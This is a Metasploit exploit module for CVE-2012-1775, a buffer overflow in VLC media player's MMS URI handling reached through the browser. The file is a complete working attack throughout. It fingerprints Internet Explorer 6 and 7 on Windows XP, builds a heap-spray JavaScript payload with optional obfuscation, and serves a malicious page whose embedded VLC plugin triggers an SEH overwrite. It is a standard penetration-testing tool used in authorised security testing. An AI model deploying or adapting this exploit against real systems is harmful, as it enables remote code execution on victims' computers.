##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super(update_info(info,
      'Name'        => "VLC MMS Stream Handling Buffer Overflow",
      'Description' => %q{
          This module exploits a buffer overflow in VLC media player VLC media player prior
        to 2.0.0. The vulnerability is due to a dangerous use of sprintf which can result
        in a stack buffer overflow when handling a malicious MMS URI.

        This module uses the browser as attack vector. A specially crafted MMS URI is
        used to trigger the overflow and get flow control through SEH overwrite. Control
        is transferred to code located in the heap through a standard heap spray.

        The module only targets IE6 and IE7 because no DEP/ASLR bypass has been provided.
      },
      'License'     => MSF_LICENSE,
      'Author'      =>
        [
          'Florent Hochwelker', # aka TaPiOn, Vulnerability discovery
          'sinn3r', # Metasploit module
          'juan vazquez' # Metasploit module
        ],
      'References' =>
        [
          ['CVE', '2012-1775'],
          ['OSVDB', '80188'],
          ['URL', 'http://www.videolan.org/security/sa1201.html'],
          # Fix commit diff
          ['URL', 'http://git.videolan.org/?p=vlc/vlc-2.0.git;a=commit;h=11a95cce96fffdbaba1be6034d7b42721667821c']
        ],
      'Payload' =>
        {
          'BadChars'        => "\x00",
          'Space'           => 1000,
        },
      'DefaultOptions' =>
        {
          'ExitFunction' => "process",
          'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform' => 'win',
      'Targets'  =>
        [
          # Tested with VLC 2.0.0
          [ 'Automatic', {} ],
          [
            'Internet Explorer 6 on XP SP3',
            {
              'Rop' => false,
              # Space needed to overflow and generate an exception
              # which allows to get control through SEH overwrite
              'Offset' => 5488,
              'OffsetShell' => '0x800 - code.length',
              'Blocks' => '1550',
              'Padding' => '0'
            }
          ],
          [
            'Internet Explorer 7 on XP SP3',
            {
              'Rop' => false,
              # Space needed to overflow and generate an exception
              # which allows to get control through SEH overwrite
              'Offset' => 5488,
              'OffsetShell' => '0x800 - code.length',
              'Blocks' => '1600',
              'Padding' => '1'
            }
          ]
        ],
      'DisclosureDate' => "Mar 15 2012",
      'DefaultTarget' => 0))

    register_options(
      [
        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])
      ], self.class)
  end

  def get_target(cli, request)
    #Default target
    my_target = target

    vprint_status("User-Agent: #{request.headers['User-Agent']}")

    if target.name == 'Automatic'
      agent = request.headers['User-Agent']
      if agent =~ /NT 5\.1/ and agent =~ /MSIE 6\.0/
        #Windows XP + IE 6
        my_target = targets[1]
      elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7\.0/
        #Windows XP + 7.0
        my_target = targets[2]
      else
        #If we don't recognize the client, we don't fire the exploit
        my_target = nil
      end
    end

    return my_target
  end

  def on_request_uri(cli, request)
    #Pick the right target
    my_target = get_target(cli, request)
    if my_target.nil?
      vprint_error("Target not supported")
      send_not_found(cli)
      return
    end

    vprint_status("URL: #{request.uri.to_s}")

    #ARCH used by the victim machine
    arch = Rex::Arch.endian(my_target.arch)
    nops = Rex::Text.to_unescape("\x0c\x0c\x0c\x0c", arch)
    code = Rex::Text.to_unescape(payload.encoded, arch)

    # Spray overwrites 0x30303030 with our payload
    spray = <<-JS
    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("#{code}");
    var nops = unescape("#{nops}");

    while (nops.length < 0x80000) nops += nops;
    var offset = nops.substring(0, #{my_target['OffsetShell']});
    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);

    heap_obj.gc();
    for (var i=0; i < #{my_target['Blocks']}; i++) {
      heap_obj.alloc(block);
    }
    JS

    #Use heaplib
    js_spray = heaplib(spray)

    #obfuscate on demand
    if datastore['OBFUSCATE']
      js_spray = ::Rex::Exploitation::JSObfu.new(js_spray)
      js_spray.obfuscate
    end


    src_ip = Rex::Socket.source_address.split('.')
    hex_ip = src_ip.map { |h| [h.to_i].pack('C*')[0].unpack('H*')[0] }.join
    # Try to maximize success on IE7 platform:
    # If first octet of IP address is minor than 16 pad with zero
    # even when heap spray could be not successful.
    # Else pad following target heap spray criteria.
    if ((hex_ip.to_i(16) >> 24) < 16)
      padding_char = '0'
    else
      padding_char = my_target['Padding']
    end

    hex_ip = "0x#{padding_char * my_target['Offset']}#{hex_ip}"

    html = <<-EOS
    <html>
    <head>
    <script>
      #{js_spray}
    </script>
    </head>
    <body>
    <OBJECT classid="clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921"
      codebase="http://downloads.videolan.org/pub/videolan/vlc/latest/win32/axvlc.cab"
      width="320"
      height="240"
      id="vlc" events="True">
      <param name="Src" value="mms://#{hex_ip}:#{datastore['SRVPORT']}" />
      <param name="ShowDisplay" value="True" />
      <param name="AutoLoop" value="False" />
      <param name="AutoPlay" value="True" />
      <EMBED pluginspage="http://www.videolan.org"
        type="application/x-vlc-plugin" progid="VideoLAN.VLCPlugin.2"
        width="320"
        height="240"
        autoplay="yes"
        loop="no"
        target="mms://#{hex_ip}:#{datastore['SRVPORT']}"
        name="vlc">
      </EMBED>
    </OBJECT>


    </body>
    </html>
    EOS

    #Remove extra tabs in HTML
    html = html.gsub(/^\t\t/, "")

    print_status("Sending malicious page")
    send_response( cli, html, {'Content-Type' => 'text/html'} )
  end
end
